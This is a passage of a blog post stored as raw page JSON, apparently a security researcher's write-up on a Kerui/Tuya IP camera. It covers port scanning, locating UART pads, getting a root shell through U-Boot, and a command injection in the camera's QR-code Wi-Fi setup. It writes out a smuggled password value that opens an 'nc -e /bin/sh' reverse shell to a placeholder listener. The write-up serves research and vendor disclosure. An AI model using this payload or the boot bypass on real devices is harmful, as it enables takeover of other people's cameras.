192.168.1.178","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*O_fjU53wZnhL_fBSZFJ8-A.png":{"__typename":"ImageMetadata","id":"1*O_fjU53wZnhL_fBSZFJ8-A.png","originalHeight":149,"originalWidth":555,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_13":{"__typename":"Paragraph","id":"21b108638587_13","name":"6474","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*O_fjU53wZnhL_fBSZFJ8-A.png"},"text":"Output for full TCP scan","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_14":{"__typename":"Paragraph","id":"21b108638587_14","name":"c9b0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"sudo nmap -sU 192.168.1.178","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*r-Ca8lIWdlgW0_6NHAxOvQ.png":{"__typename":"ImageMetadata","id":"1*r-Ca8lIWdlgW0_6NHAxOvQ.png","originalHeight":109,"originalWidth":563,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_15":{"__typename":"Paragraph","id":"21b108638587_15","name":"1c83","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*r-Ca8lIWdlgW0_6NHAxOvQ.png"},"text":"Output for UDP scan","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_16":{"__typename":"Paragraph","id":"21b108638587_16","name":"b103","type":"P","href":null,"layout":null,"metadata":null,"text":"The only port we see that may be interesting is 6668 (TUYA custom protocol) which is interesting but not for this article.\nSo we have no choice but to try and find a UART port, since we would probably want to have a root shell so we can debug the system, view logs, and much more..","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_17":{"__typename":"Paragraph","id":"21b108638587_17","name":"6fc8","type":"P","href":null,"layout":null,"metadata":null,"text":"UART identification:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":20,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_18":{"__typename":"Paragraph","id":"21b108638587_18","name":"d35d","type":"P","href":null,"layout":null,"metadata":null,"text":"We opened the camera until only the inner board and motors were left, and we tried to look at the board for any TX RX labels.\nAs we all know UART — (Universal Asynchronous Receiver\u002FTransmitter) is a hardware communication protocol that enables serial data exchange between devices. I won’t be explaining UART in this article but I will mention that it needs 3 wires: ground, TX, and RX, a ground point doesn’t matter to us since we can connect to any ground point on the board, we need to find the UART TX and UART RX.\nUnfortunately, they did a good job and didn’t leave any marks on the TX RX of the UART on the board, also they didn’t have the standard 4-pin row of a UART that lets attackers identify it in a second. kudos to them for that…\nNext what I would usually do is download the datasheet of the processor and see what pins of the processor the UART TX and RX should be in, but there isn’t a publicly available datasheet for that specific processor, I did find a datasheet for a similar processor, but it was a BGA packaging so it didn’t help me at all :\u002F Guess that we need to make some guesses to find the UART this time :( How?\nI will say that usually on IOT devices UART will be 3.3\u002F5 volts, in the Kerui camera it was 3.3. logical 1 will be 3.3 volts and logical 0 will be 0. So when identifying a UART tx test point, when we restart the device it will usually send some data that the bootloader outputs (In our cast the Uboot Bootloader) we should see on idle 3.3 volts, and when the Uboot sends data we will see it float between 0–3.3.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":989,"end":1006,"href":"https:\u002F\u002Fmonitor.espec.ws\u002Ffiles\u002F700cafec77419c2d7705f376c974b8d0ff72_986.pdf","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_19":{"__typename":"Paragraph","id":"21b108638587_19","name":"79c3","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately, I do not have a JTAGULATOR or other stuff that can help me bruteforce the test points quickly. So I did an old-school move, grabbed a multimeter, and tested each point. It didn’t take a lot until I found a point that behaves that way.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":31,"end":42,"href":"https:\u002F\u002Fgrandideastudio.com\u002Fportfolio\u002Fsecurity\u002Fjtagulator\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*yxvfrZ0nLAK6GldYPq6cTg.png":{"__typename":"ImageMetadata","id":"1*yxvfrZ0nLAK6GldYPq6cTg.png","originalHeight":2048,"originalWidth":1536,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_20":{"__typename":"Paragraph","id":"21b108638587_20","name":"129e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*yxvfrZ0nLAK6GldYPq6cTg.png"},"text":"The TX and RX testpoints of the UART of the board","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_21":{"__typename":"Paragraph","id":"21b108638587_21","name":"a68b","type":"P","href":null,"layout":null,"metadata":null,"text":"Now we will need a USB to UART adapter So we can connect the possible TX point to the RX on the adapter and see if we can view something. Since UART is asynchronous, we need also to guess the baud rate. There are many options and to my luck, they were using 115200, which is widely used and a classic baud rate. \nSo now we connect it to our computer and use Minicom or Putty to see if we have data.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":19,"end":39,"href":"https:\u002F\u002Fhe.aliexpress.com\u002Fitem\u002F32637261853.html?src=google&src=google&albch=shopping&acnt=494-037-6276&isdl=y&slnk=&plac=&mtctp=&albbt=Google_7_shopping&aff_platform=google&aff_short_key=UneMJZVf&gclsrc=aw.ds&albagn=888888&ds_e_adid=&ds_e_matchtype=&ds_e_device=c&ds_e_network=x&ds_e_product_group_id=&ds_e_product_id=he32637261853&ds_e_product_merchant_id=109036335&ds_e_product_country=IL&ds_e_product_language=iw&ds_e_product_channel=online&ds_e_product_store_id=&ds_url_v=2&albcp=19373940215&albag=&isSmbAutoCall=false&needSmbHouyi=false&gad_source=1&gclid=CjwKCAjw5qC2BhB8EiwAvqa41jCW91o1S3oln1wOX5cH0wcy7LEhZAZmVDj1zVu26cbwy8Zr0nsf_RoCxt0QAvD_BwE&gatewayAdapt=glo2isr","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*wt6iXp2IW2KVD8KpAAyFwQ.png":{"__typename":"ImageMetadata","id":"1*wt6iXp2IW2KVD8KpAAyFwQ.png","originalHeight":677,"originalWidth":670,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_22":{"__typename":"Paragraph","id":"21b108638587_22","name":"48b4","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wt6iXp2IW2KVD8KpAAyFwQ.png"},"text":"We see output through our putty conected to the serial of the USB to UART adapter","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_23":{"__typename":"Paragraph","id":"21b108638587_23","name":"95d8","type":"P","href":null,"layout":null,"metadata":null,"text":"Now we also want to be able to write stuff to the UART so we will need to find the RX test point. basically the same, it can also be 0 volts on idle depending on other stuff that I don’t want to dig deeper into. We will take that test point which we think is the one, Connect a wire to the USB adapter’s RX, simply hold a man jumper wire onto the test point, and try to press some keystrokes, if you get the correct one, It’s soldering time.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*6yG9fvqagjY7pdfXWLdWmg.jpeg":{"__typename":"ImageMetadata","id":"1*6yG9fvqagjY7pdfXWLdWmg.jpeg","originalHeight":4032,"originalWidth":3024,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_24":{"__typename":"Paragraph","id":"21b108638587_24","name":"be85","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*6yG9fvqagjY7pdfXWLdWmg.jpeg"},"text":"After soldering and connecting to USB to UART adapter","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_25":{"__typename":"Paragraph","id":"21b108638587_25","name":"08fa","type":"P","href":null,"layout":null,"metadata":null,"text":"After soldering now we have a bootloader that we can view logs addresses and more. But I don’t care about addresses this time, I want a root shell.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_26":{"__typename":"Paragraph","id":"21b108638587_26","name":"e1db","type":"P","href":null,"layout":null,"metadata":null,"text":"Fortunately, the Uboot has a 1-second “bootdelay”, which lets us stop the Uboot before it starts the boot. If the “bootdelay” parameter was 0 seconds, we wouldn’t be able to stop the boot, and that could be much more annoying to use it.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":39,"end":49,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*maIOnw-YBdfq7KKJCdWipw.png":{"__typename":"ImageMetadata","id":"1*maIOnw-YBdfq7KKJCdWipw.png","originalHeight":413,"originalWidth":882,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_27":{"__typename":"Paragraph","id":"21b108638587_27","name":"98db","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*maIOnw-YBdfq7KKJCdWipw.png"},"text":"We can interrupt Uboot before it boots","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_28":{"__typename":"Paragraph","id":"21b108638587_28","name":"6676","type":"P","href":null,"layout":null,"metadata":null,"text":"Getting a root shell + TELNET and FTP","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":37,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_29":{"__typename":"Paragraph","id":"21b108638587_29","name":"fdf6","type":"P","href":null,"layout":null,"metadata":null,"text":"Now we kind of want to extract the firmware image to understand what is going on with the init flow of the camera. View if we can do something to get ourselves root, maybe there is a bad password on “\u002Fetc\u002Fshadow” we can try to bruteforce?\nAfter extracting the firmware with a clip and a Raspberry Pie with the flashrom program, we can look at its contents, from Uboot mtdparts command output we can understand that the main app is sitting on the last partition. so let’s look at that:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":276,"end":281,"href":"https:\u002F\u002Ftrmm.net\u002FSPI_flash\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":310,"end":318,"href":"https:\u002F\u002Fhacklido.com\u002Fblog\u002F379-firmware-extraction-from-spi-flash","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_30":{"__typename":"Paragraph","id":"21b108638587_30","name":"beb9","type":"P","href":null,"layout":null,"metadata":null,"text":"Since the device is using busybox, and busybox init will read from \u002Fetc\u002Finittab, we should look at that:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*mUOzmHYTvK9ek8xzU7Ktww.png":{"__typename":"ImageMetadata","id":"1*mUOzmHYTvK9ek8xzU7Ktww.png","originalHeight":433,"originalWidth":662,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_31":{"__typename":"Paragraph","id":"21b108638587_31","name":"c1dc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*mUOzmHYTvK9ek8xzU7Ktww.png"},"text":"\u002Fetc\u002Finittab contents","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_32":{"__typename":"Paragraph","id":"21b108638587_32","name":"0520","type":"P","href":null,"layout":null,"metadata":null,"text":"As we can see here it start rcS, which will call rc.local and some other scripts until it gets interesting: It calls a script called anyka_service.sh that will check for a configuration file called anyka_cfg.ini, if the variable debug_uart is set to 1, we have TELNET and FTP, how nice of them ❤","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*BfVqeIa-Y8X5LFPE50zkdg.png":{"__typename":"ImageMetadata","id":"1*BfVqeIa-Y8X5LFPE50zkdg.png","originalHeight":390,"originalWidth":773,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_33":{"__typename":"Paragraph","id":"21b108638587_33","name":"07a2","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*BfVqeIa-Y8X5LFPE50zkdg.png"},"text":"A part of the anyka_script.sh","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_34":{"__typename":"Paragraph","id":"21b108638587_34","name":"823e","type":"P","href":null,"layout":null,"metadata":null,"text":"Eventually it will run the binary anyka_ipc which is doing pretty much everything else in the camera.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*x4dLdouXQHrV3JawcGAs-Q.png":{"__typename":"ImageMetadata","id":"1*x4dLdouXQHrV3JawcGAs-Q.png","originalHeight":107,"originalWidth":327,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_35":{"__typename":"Paragraph","id":"21b108638587_35","name":"859c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*x4dLdouXQHrV3JawcGAs-Q.png"},"text":"A part of the anyka_cfg.ini","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_36":{"__typename":"Paragraph","id":"21b108638587_36","name":"45eb","type":"P","href":null,"layout":null,"metadata":null,"text":"So the only thing we need is to get the anyka_cfg.ini and change its debug_uart variable to 1, there are many ways to get that:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_37":{"__typename":"Paragraph","id":"21b108638587_37","name":"6db1","type":"P","href":null,"layout":null,"metadata":null,"text":"First I tried bruteforcing root’s password so I could interact with the Uboot shell I have and change the flag there. I couldn’t bruteforce it, so I’ll do something else:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_38":{"__typename":"Paragraph","id":"21b108638587_38","name":"681a","type":"P","href":null,"layout":null,"metadata":null,"text":"Since we can stop Uboot we can do a lot of fun stuff, one of them is simply to execute \u002Fbin\u002Fsh through Uboot, by setting the init parameter as \u002Fbin\u002Fsh","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_39":{"__typename":"Paragraph","id":"21b108638587_39","name":"7356","type":"PRE","href":null,"layout":null,"metadata":null,"text":"setenv boot_normal env set bootargs console=ttySAK0,115200n8 root=\u002Fdev\u002Fmtdblock5 rootfstype=squashfs init=\u002Fbin\u002Fsh \\$\\{mtdparts\\} \\$\\{mem\\} \\$\\{memsize\\}\\; run read_kernel\\; bootm \\$\\{loadaddr\\} - \\$\\{fdtcontroladdr\\}\n\nrun boot_normal","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_40":{"__typename":"Paragraph","id":"21b108638587_40","name":"7b2c","type":"P","href":null,"layout":null,"metadata":null,"text":"Now we basically have a root shell, but it is missing many of the stuff that will happen on boot and we can run \u002Fsbin\u002Finit ourselves but we dont want that. We want to get ourselves TELNET and FTP.. The anyka_cfg.ini is on a filesystem on a partition which its name is CONFIG, simply mount that, change the flag, umount and restart. now we will have debug_uart set, or basically TELNET and FTP. But how will we connect to the telnet? we dont have a user yet, so we will also remove the ‘x’ from the \u002Fetc\u002Fpasswd file which says that there is a password for the user in the \u002Fetc\u002Fshadow file so root won’t have a password. For that scenario that was enough:\n(Also created another user which is the same and named user)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*L6iy3B-xuH7VD7YIHDo0xA.png":{"__typename":"ImageMetadata","id":"1*L6iy3B-xuH7VD7YIHDo0xA.png","originalHeight":52,"originalWidth":255,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_41":{"__typename":"Paragraph","id":"21b108638587_41","name":"402c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*L6iy3B-xuH7VD7YIHDo0xA.png"},"text":"The change to make root and user without a password","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_42":{"__typename":"Paragraph","id":"21b108638587_42","name":"d318","type":"P","href":null,"layout":null,"metadata":null,"text":"We have telnet :) Hurray","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*RtAlw8l2im6ZWypqi9fKNA.png":{"__typename":"ImageMetadata","id":"1*RtAlw8l2im6ZWypqi9fKNA.png","originalHeight":35,"originalWidth":308,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_43":{"__typename":"Paragraph","id":"21b108638587_43","name":"a53c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RtAlw8l2im6ZWypqi9fKNA.png"},"text":"Root Telnet","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_44":{"__typename":"Paragraph","id":"21b108638587_44","name":"f942","type":"P","href":null,"layout":null,"metadata":null,"text":"We have uploaded a gdbserver and tcpdump to the camera using the FTP that we have now. \nnow we can debug the camera main binary, which is the anyka_ipc, After a good reverse engineering sessions, we have found the vulnerability:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_45":{"__typename":"Paragraph","id":"21b108638587_45","name":"8445","type":"H3","href":null,"layout":null,"metadata":null,"text":"The Vulnerability","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":17,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_46":{"__typename":"Paragraph","id":"21b108638587_46","name":"22e7","type":"P","href":null,"layout":null,"metadata":null,"text":"What is a QR Code:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_47":{"__typename":"Paragraph","id":"21b108638587_47","name":"f948","type":"P","href":null,"layout":null,"metadata":null,"text":"Chatgpt — “A QR code (Quick Response code) is a type of two-dimensional barcode that can store information in a way that is easily scannable by devices like smartphones, tablets, and QR code readers.”","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":13,"end":20,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_48":{"__typename":"Paragraph","id":"21b108638587_48","name":"5e57","type":"P","href":null,"layout":null,"metadata":null,"text":"The camera uses the QR code mechanism to connect to the Wifi of the user. When you open the camera when it’s not connected to any Wifi, it is in its provisioning mode, In that mode there is a thread that tries to scan a QR code from the camera’s POV. When it finds that QR Code, it should have a JSON with 3 parameters:\ns — SSID (Service Set Identifier) — your wifi name\np — Password of the Wifi\nt — token\nWell basically we don’t care about how QR is implemented, the only thing we care about is how that connects to the vulnerability.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_49":{"__typename":"Paragraph","id":"21b108638587_49","name":"f8d5","type":"P","href":null,"layout":null,"metadata":null,"text":"Lets give a brief overview on how the exploit works and dive into the code:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jkIhqNMmtc4Cl5vVjZDxqw.png":{"__typename":"ImageMetadata","id":"1*jkIhqNMmtc4Cl5vVjZDxqw.png","originalHeight":1113,"originalWidth":654,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_50":{"__typename":"Paragraph","id":"21b108638587_50","name":"1fd2","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jkIhqNMmtc4Cl5vVjZDxqw.png"},"text":"A Diagram that shows the flow of the code leading to the exploit","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_51":{"__typename":"Paragraph","id":"21b108638587_51","name":"21a0","type":"P","href":null,"layout":null,"metadata":null,"text":"Basically that QR code thread is scanning QRs as we’ve already mentioned, it runs a loop and calls the magic function which I kept unnamed “sub_AD1D0” which calls some external libraries including zbar (for QR parsing), that function tries to scan a QR and returns a JSON of its content. If it finds a QR it will break the while and call the function qr_code_connect_wifi with the JSON as its parameter:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*hDKH9fIHR1hz_TlKP2G1-Q.png":{"__typename":"ImageMetadata","id":"1*hDKH9fIHR1hz_TlKP2G1-Q.png","originalHeight":486,"originalWidth":390,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_52":{"__typename":"Paragraph","id":"21b108638587_52","name":"4b62","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*hDKH9fIHR1hz_TlKP2G1-Q.png"},"text":"The QR Thread that runs in the background","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_53":{"__typename":"Paragraph","id":"21b108638587_53","name":"7d73","type":"P","href":null,"layout":null,"metadata":null,"text":"In that qr_code_connect_wifi function, we can see it parses the JSON from before and extracts the s, p, and b? Until now I didn’t know what that was supposed to be. I guess it’s a misspelling of t? The Tuya Smart Life application generates a token, which could have been used here but, it doesn’t? If they would use it mightv’e been harder to simply get the camera to parse any QR like it is now.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*QNeEuXA_K3ZMj1oNEX4QQg.png":{"__typename":"ImageMetadata","id":"1*QNeEuXA_K3ZMj1oNEX4QQg.png","originalHeight":489,"originalWidth":404,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_54":{"__typename":"Paragraph","id":"21b108638587_54","name":"c688","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*QNeEuXA_K3ZMj1oNEX4QQg.png"},"text":"qr_code_connect_wifi function contents","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_55":{"__typename":"Paragraph","id":"21b108638587_55","name":"63a2","type":"P","href":null,"layout":null,"metadata":null,"text":"Lets leave all the other overflows aside, since they will anyways be much harder to implement, and we have the easier way.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_56":{"__typename":"Paragraph","id":"21b108638587_56","name":"b37e","type":"P","href":null,"layout":null,"metadata":null,"text":"The vulnerability (well the worst one in that code) lies in the function sys_connect_wifi. who is being called with the SSID and password from the QR.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*9TC97711Rc1vUILWLKKQOA.png":{"__typename":"ImageMetadata","id":"1*9TC97711Rc1vUILWLKKQOA.png","originalHeight":666,"originalWidth":880,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_57":{"__typename":"Paragraph","id":"21b108638587_57","name":"2393","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*9TC97711Rc1vUILWLKKQOA.png"},"text":"I guess davis didn’t do a gj after all :( we still love you though ❤","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_58":{"__typename":"Paragraph","id":"21b108638587_58","name":"f851","type":"P","href":null,"layout":null,"metadata":null,"text":"Again ignore the other vulnerabilities we have here and let’s focus on the worst one: as we can see from line 39 to 41, we are copying a string with who connects to the wifi with our ssid and password, but wait.. Why there is no sanitizing of our input? A classic command injection vulnerability.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_59":{"__typename":"Paragraph","id":"21b108638587_59","name":"3505","type":"P","href":null,"layout":null,"metadata":null,"text":"From there it will enter system_cmd who will call system eventually and trigger our vulnerability.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*9725YUKUetM1m36rD6b2Nw.png":{"__typename":"ImageMetadata","id":"1*9725YUKUetM1m36rD6b2Nw.png","originalHeight":188,"originalWidth":311,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_60":{"__typename":"Paragraph","id":"21b108638587_60","name":"c21d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*9725YUKUetM1m36rD6b2Nw.png"},"text":"system_cmd function","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_61":{"__typename":"Paragraph","id":"21b108638587_61","name":"b873","type":"H3","href":null,"layout":null,"metadata":null,"text":"Abusing the command injection","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_62":{"__typename":"Paragraph","id":"21b108638587_62","name":"b333","type":"P","href":null,"layout":null,"metadata":null,"text":"The camera connects to the Wi-fi using a script called lv_wifi_connect.sh, since we are in provisioning mode, and we have no connection to our LAN from the camera, we can’t simply inject a Netcat reverse shell. We need first to connect the wifi and after that when we are connected, run a reverse shell from the camera and connect to our Netcat listener.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_63":{"__typename":"Paragraph","id":"21b108638587_63","name":"2055","type":"P","href":null,"layout":null,"metadata":null,"text":"Since both SSID and PASSWORD are contenders for the command injection, I have picked the password. And I injected the following line:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_64":{"__typename":"Paragraph","id":"21b108638587_64","name":"0c49","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$(sh \u002Fusr\u002Fsbin\u002Flv_wifi_connect.sh {SSID} {PASSWORD} & sleep 30; nc {NC_IP} {NC_PORT} -e \u002Fbin\u002Fsh)\n# Create a QR code with data","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_65":{"__typename":"Paragraph","id":"21b108638587_65","name":"6cf4","type":"P","href":null,"layout":null,"metadata":null,"text":"What would happen here, is that the camera will parse the parameters, s, and p (will completely ignore t as we have said) and continue to the part where the vulnerability triggers, there instead of sending the lv_wifi_connect.sh script the password parameter, it will execute the connection to the WIFI, as set from the SSID and PASSWORD variables. Wait for a few seconds and then trigger a reverse shell that will connect to your listener.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_66":{"__typename":"Paragraph","id":"21b108638587_66","name":"0a7a","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately, TUYA has not responded for more than 90 days, and the bug has not been 